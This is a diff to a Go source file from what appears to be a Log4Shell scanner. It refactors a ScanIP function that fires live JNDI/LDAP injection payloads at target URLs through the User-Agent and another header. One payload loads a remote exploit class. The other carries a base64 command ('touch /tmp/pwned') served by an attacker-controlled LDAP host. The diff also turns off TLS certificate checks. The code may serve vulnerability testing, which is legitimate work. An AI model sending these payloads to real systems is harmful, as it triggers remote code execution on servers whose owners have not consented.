@@ -1,25 +1,31 @@
 package cmd
 
 import (
+	"crypto/tls"
 	"fmt"
-	"github.com/pterm/pterm"
-	log "github.com/sirupsen/logrus"
 	"net"
 	"net/http"
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/pterm/pterm"
+	log "github.com/sirupsen/logrus"
 )
 
-func ScanIP(targetUrl string, serverUrl string, wg *sync.WaitGroup) {
+func ScanIP(targetUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan string) {
+	defer wg.Done()
+
 	client := &http.Client{
 		Timeout: 3 * time.Second,
 		Transport: &http.Transport{
 			TLSHandshakeTimeout:   1 * time.Second,
 			ResponseHeaderTimeout: 1 * time.Second,
 			ExpectContinueTimeout: 1 * time.Second,
+			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
 		},
 	}
+
 	targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", serverUrl)
 	targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", serverUrl)
 	log.Debugf("Target URL: %s", targetUrl)
@@ -38,10 +44,9 @@ func ScanIP(targetUrl string, serverUrl string, wg *sync.WaitGroup) {
 	}
 	if response != nil {
 		msg := fmt.Sprintf("We got a response, %s ==> Status code: %d", targetUrl, response.StatusCode)
+		resChan <- msg
 		log.Infof(msg)
-		pterm.Info.Println(msg)
 	}
-	wg.Done()
 }
 
 // GetLocalIP returns the non loopback local IP of the host
